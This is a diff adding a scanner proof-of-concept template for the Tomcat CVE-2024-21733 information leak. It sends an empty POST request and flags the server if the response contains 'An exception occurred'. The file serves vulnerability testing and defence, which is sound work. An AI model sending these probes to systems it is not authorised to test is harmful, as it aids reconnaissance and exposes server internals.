@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "验证 Apache Tomcat CVE-2024-21733 漏洞，通过发送特制 POST 请求触发服务器返回包含敏感异常信息的错误页面，检测是否存在信息泄露"
+id = "POC-AVE-2024-0014"
+name = "Apache Tomcat 错误消息敏感信息泄露 PoC"
+severity = "medium"
+tags = ["ave-2024-0014"]
+vuln_id = [
+    "CVE-2024-21733",
+    "AVE-2024-0014",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.headers]
+Content-Length = "0"
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["An exception occurred"]
